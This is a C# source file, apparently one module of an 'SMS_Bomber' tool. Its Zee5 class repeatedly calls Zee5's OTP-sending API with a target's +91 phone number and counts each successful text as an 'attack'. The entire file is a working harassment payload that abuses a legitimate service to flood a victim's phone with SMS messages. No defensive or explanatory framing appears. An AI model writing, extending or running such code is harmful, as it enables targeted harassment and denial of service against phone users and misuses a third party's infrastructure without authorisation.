using System.Net.Http;
using System.Threading.Tasks;

namespace SMS_Bomber.Sender
{
    public class Zee5 : ISender
    {
        public int Failed { get; set; }
        public int Attacked { get; set; }
        public int TotalRequest { get; set; }
        public string Provider => "Zee5";
        private readonly HttpClient Attacker = new HttpClient();

        public async Task<bool> Attack(long To, bool Retry = false)
        {
            TotalRequest++;
            var AtkMSG = new HttpRequestMessage(HttpMethod.Get,
                $"https://b2bapi.zee5.com/device/sendotp_v1.php?phoneno=+91{To}");

            try
            {
                var AtkRES = await (await Attacker.SendAsync(AtkMSG)).Content.ReadAsStringAsync();
                if (AtkRES.Contains("\"code\":0")) { Attacked++; return true; }
            }
            catch { }

            Failed++;
            return false;
        }
    }
}
